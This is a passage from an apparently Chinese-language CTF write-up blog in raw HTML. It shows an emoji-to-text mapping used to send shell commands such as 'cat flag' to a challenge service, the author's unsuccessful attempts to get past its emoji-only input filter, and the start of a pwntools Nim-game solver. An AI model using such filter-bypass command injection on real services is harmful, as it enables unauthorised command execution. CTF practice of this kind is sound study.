class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😕&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙃&quot;</span>: <span class="string">&quot;(:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤑&quot;</span>: <span class="string">&quot;$)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😲&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;☹️&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙁&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😖&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😞&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😟&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😤&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😢&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😭&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😦&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😧&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😨&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😩&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤯&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😬&quot;</span>: <span class="string">&quot;:E&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😰&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😱&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥵&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥶&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😳&quot;</span>: <span class="string">&quot;:$&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤪&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😵&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥴&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😠&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😡&quot;</span>: <span class="string">&quot;&gt;:(，&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤬&quot;</span>: <span class="string">&quot;#$%&amp;!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤕&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤢&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤮&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤧&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😇&quot;</span>: <span class="string">&quot;O:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥳&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥺&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤡&quot;</span>: <span class="string">&quot;:o)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤠&quot;</span>: <span class="string">&quot;Y)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤥&quot;</span>: <span class="string">&quot;:L&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤫&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤭&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐶&quot;</span>: <span class="string">&quot;dog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐱&quot;</span>: <span class="string">&quot;cat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐭&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐹&quot;</span>: <span class="string">&quot;hamster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐰&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦊&quot;</span>: <span class="string">&quot;fox&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐻&quot;</span>: <span class="string">&quot;bear&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐼&quot;</span>: <span class="string">&quot;panda&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐨&quot;</span>: <span class="string">&quot;koala&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐯&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦁&quot;</span>: <span class="string">&quot;lion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐮&quot;</span>: <span class="string">&quot;cow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐷&quot;</span>: <span class="string">&quot;pig&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐽&quot;</span>: <span class="string">&quot;pig nose&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐸&quot;</span>: <span class="string">&quot;frog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐒&quot;</span>: <span class="string">&quot;monkey&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐔&quot;</span>: <span class="string">&quot;chicken&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐧&quot;</span>: <span class="string">&quot;penguin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐦&quot;</span>: <span class="string">&quot;bird&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐤&quot;</span>: <span class="string">&quot;baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐣&quot;</span>: <span class="string">&quot;hatching chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐥&quot;</span>: <span class="string">&quot;front-facing baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦆&quot;</span>: <span class="string">&quot;duck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦅&quot;</span>: <span class="string">&quot;eagle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦉&quot;</span>: <span class="string">&quot;owl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦇&quot;</span>: <span class="string">&quot;bat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐺&quot;</span>: <span class="string">&quot;wolf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐗&quot;</span>: <span class="string">&quot;boar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐴&quot;</span>: <span class="string">&quot;horse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦄&quot;</span>: <span class="string">&quot;unicorn&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐝&quot;</span>: <span class="string">&quot;bee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐛&quot;</span>: <span class="string">&quot;bug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦋&quot;</span>: <span class="string">&quot;butterfly&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐌&quot;</span>: <span class="string">&quot;snail&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐞&quot;</span>: <span class="string">&quot;lady beetle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐜&quot;</span>: <span class="string">&quot;ant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦟&quot;</span>: <span class="string">&quot;mosquito&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦗&quot;</span>: <span class="string">&quot;cricket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕷️&quot;</span>: <span class="string">&quot;spider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕸️&quot;</span>: <span class="string">&quot;spider web&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦂&quot;</span>: <span class="string">&quot;scorpion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐢&quot;</span>: <span class="string">&quot;turtle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐍&quot;</span>: <span class="string">&quot;python&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦎&quot;</span>: <span class="string">&quot;lizard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦖&quot;</span>: <span class="string">&quot;T-Rex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦕&quot;</span>: <span class="string">&quot;sauropod&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐙&quot;</span>: <span class="string">&quot;octopus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦑&quot;</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦐&quot;</span>: <span class="string">&quot;shrimp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦞&quot;</span>: <span class="string">&quot;lobster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦀&quot;</span>: <span class="string">&quot;crab&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐡&quot;</span>: <span class="string">&quot;blowfish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐠&quot;</span>: <span class="string">&quot;tropical fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐟&quot;</span>: <span class="string">&quot;fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐬&quot;</span>: <span class="string">&quot;dolphin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐳&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐋&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦈&quot;</span>: <span class="string">&quot;shark&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐊&quot;</span>: <span class="string">&quot;crocodile&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐅&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐆&quot;</span>: <span class="string">&quot;leopard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦓&quot;</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦍&quot;</span>: <span class="string">&quot;gorilla&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦧&quot;</span>: <span class="string">&quot;orangutan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦣&quot;</span>: <span class="string">&quot;mammoth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐘&quot;</span>: <span class="string">&quot;elephant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦛&quot;</span>: <span class="string">&quot;hippopotamus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦏&quot;</span>: <span class="string">&quot;rhinoceros&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐪&quot;</span>: <span class="string">&quot;camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐫&quot;</span>: <span class="string">&quot;two-hump camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦒&quot;</span>: <span class="string">&quot;giraffe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦘&quot;</span>: <span class="string">&quot;kangaroo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦬&quot;</span>: <span class="string">&quot;bison&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦥&quot;</span>: <span class="string">&quot;sloth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦦&quot;</span>: <span class="string">&quot;otter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦨&quot;</span>: <span class="string">&quot;skunk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦡&quot;</span>: <span class="string">&quot;badger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐾&quot;</span>: <span class="string">&quot;paw prints&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◼️&quot;</span>: <span class="string">&quot;black square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◻️&quot;</span>: <span class="string">&quot;white square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◾&quot;</span>: <span class="string">&quot;black medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◽&quot;</span>: <span class="string">&quot;white medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;▪️&quot;</span>: <span class="string">&quot;black small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;▫️&quot;</span>: <span class="string">&quot;white small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔶&quot;</span>: <span class="string">&quot;large orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔷&quot;</span>: <span class="string">&quot;large blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔸&quot;</span>: <span class="string">&quot;small orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔹&quot;</span>: <span class="string">&quot;small blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔺&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔻&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔼&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔽&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔘&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⚪&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⚫&quot;</span>: <span class="string">&quot;black circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟠&quot;</span>: <span class="string">&quot;orange circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟢&quot;</span>: <span class="string">&quot;green circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔵&quot;</span>: <span class="string">&quot;blue circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟣&quot;</span>: <span class="string">&quot;purple circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟡&quot;</span>: <span class="string">&quot;yellow circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟤&quot;</span>: <span class="string">&quot;brown circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⭕&quot;</span>: <span class="string">&quot;empty circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅰️&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅱️&quot;</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅾️&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ℹ️&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅿️&quot;</span>: <span class="string">&quot;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Ⓜ️&quot;</span>: <span class="string">&quot;M&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆎&quot;</span>: <span class="string">&quot;AB&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆑&quot;</span>: <span class="string">&quot;CL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆒&quot;</span>: <span class="string">&quot;COOL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆓&quot;</span>: <span class="string">&quot;FREE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆔&quot;</span>: <span class="string">&quot;ID&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆕&quot;</span>: <span class="string">&quot;NEW&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆖&quot;</span>: <span class="string">&quot;NG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆗&quot;</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆘&quot;</span>: <span class="string">&quot;SOS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆙&quot;</span>: <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆚&quot;</span>: <span class="string">&quot;VS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;㊗️&quot;</span>: <span class="string">&quot;祝&quot;</span>,</span><br><span class="line">    <span class="string">&quot;㊙️&quot;</span>: <span class="string">&quot;秘&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈺&quot;</span>: <span class="string">&quot;營&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈯&quot;</span>: <span class="string">&quot;指&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🉐&quot;</span>: <span class="string">&quot;得&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈹&quot;</span>: <span class="string">&quot;割&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈚&quot;</span>: <span class="string">&quot;無&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈲&quot;</span>: <span class="string">&quot;禁&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈸&quot;</span>: <span class="string">&quot;申&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈴&quot;</span>: <span class="string">&quot;合&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈳&quot;</span>: <span class="string">&quot;空&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈵&quot;</span>: <span class="string">&quot;滿&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈶&quot;</span>: <span class="string">&quot;有&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈷️&quot;</span>: <span class="string">&quot;月&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚗&quot;</span>: <span class="string">&quot;car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚕&quot;</span>: <span class="string">&quot;taxi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚙&quot;</span>: <span class="string">&quot;SUV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚌&quot;</span>: <span class="string">&quot;bus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚎&quot;</span>: <span class="string">&quot;trolleybus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🏎️&quot;</span>: <span class="string">&quot;race car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚓&quot;</span>: <span class="string">&quot;police car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚑&quot;</span>: <span class="string">&quot;ambulance&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚒&quot;</span>: <span class="string">&quot;fire engine&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚐&quot;</span>: <span class="string">&quot;minibus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚚&quot;</span>: <span class="string">&quot;delivery truck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚛&quot;</span>: <span class="string">&quot;articulated lorry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚜&quot;</span>: <span class="string">&quot;tractor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛴&quot;</span>: <span class="string">&quot;kick scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚲&quot;</span>: <span class="string">&quot;bicycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛵&quot;</span>: <span class="string">&quot;scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🏍️&quot;</span>: <span class="string">&quot;motorcycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;✈️&quot;</span>: <span class="string">&quot;airplane&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚀&quot;</span>: <span class="string">&quot;rocket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛸&quot;</span>: <span class="string">&quot;UFO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚁&quot;</span>: <span class="string">&quot;helicopter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛶&quot;</span>: <span class="string">&quot;canoe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⛵&quot;</span>: <span class="string">&quot;sailboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚤&quot;</span>: <span class="string">&quot;speedboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛳️&quot;</span>: <span class="string">&quot;passenger ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⛴️&quot;</span>: <span class="string">&quot;ferry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛥️&quot;</span>: <span class="string">&quot;motor boat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚢&quot;</span>: <span class="string">&quot;ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👨&quot;</span>: <span class="string">&quot;man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👩&quot;</span>: <span class="string">&quot;woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👶&quot;</span>: <span class="string">&quot;baby&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🧓&quot;</span>: <span class="string">&quot;old man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👵&quot;</span>: <span class="string">&quot;old woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💿&quot;</span>: <span class="string">&quot;CD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📀&quot;</span>: <span class="string">&quot;DVD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📱&quot;</span>: <span class="string">&quot;phone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💻&quot;</span>: <span class="string">&quot;laptop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖥️&quot;</span>: <span class="string">&quot;pc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖨️&quot;</span>: <span class="string">&quot;printer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⌨️&quot;</span>: <span class="string">&quot;keyboard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖱️&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖲️&quot;</span>: <span class="string">&quot;trackball&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕹️&quot;</span>: <span class="string">&quot;joystick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🗜️&quot;</span>: <span class="string">&quot;clamp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💾&quot;</span>: <span class="string">&quot;floppy disk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💽&quot;</span>: <span class="string">&quot;minidisc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;☎️&quot;</span>: <span class="string">&quot;telephone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📟&quot;</span>: <span class="string">&quot;pager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📺&quot;</span>: <span class="string">&quot;television&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📻&quot;</span>: <span class="string">&quot;radio&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🎙️&quot;</span>: <span class="string">&quot;studio microphone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🎚️&quot;</span>: <span class="string">&quot;level slider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🎛️&quot;</span>: <span class="string">&quot;control knobs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⏰&quot;</span>: <span class="string">&quot;alarm clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕰️&quot;</span>: <span class="string">&quot;mantelpiece clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⌚&quot;</span>: <span class="string">&quot;watch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📡&quot;</span>: <span class="string">&quot;satellite antenna&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔋&quot;</span>: <span class="string">&quot;battery&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔌&quot;</span>: <span class="string">&quot;plug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚩&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⓿&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❶&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❷&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❸&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❹&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❺&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❻&quot;</span>: <span class="string">&quot;6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❼&quot;</span>: <span class="string">&quot;7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❽&quot;</span>: <span class="string">&quot;8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❾&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❿&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⭐&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;➕&quot;</span>: <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    <span class="string">&quot;➖&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;✖️&quot;</span>: <span class="string">&quot;×&quot;</span>,</span><br><span class="line">    <span class="string">&quot;➗&quot;</span>: <span class="string">&quot;÷&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我們已經知道了每個符號所對應到的字符，我馬上嘗試使用</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐱 🚩 (cat flag)</span><br></pre></td></tr></table></figure><p>但可惜題目回應<code>cat: flag: Is a directory</code>，代表這層目錄的 flag 是一個目錄而不是個文件，沒辦法 cat。我推測真正的 flag 是在<code>flag/flag</code>的位置，於是我又嘗試了</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐱 🚩/🚩 (cat flag/flag)</span><br></pre></td></tr></table></figure><p>但是題目會擋掉所有非 emoji 所輸入的東西，所以只能透過組合 emoji 去 bypass 這個條件，可是我嘗試了兩天還是不知道要怎麼繞過才能 cat 到 flag 底下的 flag。</p><h2 id="Quantum-Nim-Heist">Quantum Nim Heist</h2><p>這題是個尼姆遊戲，我上網查了一下之後發現他是有必勝方法的(有點類似小時候玩那種誰先喊到 21 就贏了的遊戲)。所以我就寫了下面的 exploit script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_move</span>(<span class="params">piles</span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    nim_sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pile <span class="keyword">in</span> piles:</span><br><span class="line">        nim_sum ^= <span class="built_in">int</span>(pile)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nim_sum == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># losing game, make a random move</span></span><br><span class="line">        pile = 